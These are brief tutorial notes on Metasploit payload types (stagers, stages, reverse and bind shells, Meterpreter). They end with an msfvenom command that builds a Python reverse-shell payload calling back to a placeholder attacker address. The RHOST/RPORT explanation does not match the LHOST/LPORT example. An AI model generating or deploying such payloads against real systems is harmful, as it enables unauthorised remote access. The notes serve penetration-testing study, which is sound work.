Categories of Payloads:
#### Singles
- Standalone payloads that perform a specific action without requiring additional components.
- Example: Adding a user to the system (`adduser`) or executing a command.
#### Stagers
- Lightweight payloads designed to establish a connection between the attacker and the target.
- Their purpose is to facilitate the delivery of a larger payload (stage) while using minimal resources.
- Example: reverse_tcp (sets up a reverse connection from the target to the attacker).
#### Stages
- Larger, feature-rich payloads sent after the stager establishes a connection.
- Stages offer advanced capabilities, such as a full interactive session or remote control.
- Example: `meterpreter` (a robust, interactive shell with advanced tools for post-exploitation).
### Reverse Shell Payloads:

The target system initiates a connection back to the attacker's machine.
Useful when the target is behind a firewall or NAT. Example:
`linux/meterpreter/reverse_tcp`
### Bind Shell Payloads

The target system opens a port and waits for the attacker to connect.
Often blocked by firewalls but useful in certain situations. Example:
`windows/meterpreter/bind_tcp`

### Meterpreter Payloads

An advanced, modular payload that allows you to interact with the target system.
Includes features like process management, file transfer, and privilege escalation. Example:
`windows/meterpreter/reverse_https`

Most payloads require 2 key options:
- RHOST: The target's IP address where the shell will be available.
- RPORT: The port on the target system to connect to.

Example (to generate a Python payload):
```python
msfvenom -p python/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f raw > payload.py
```
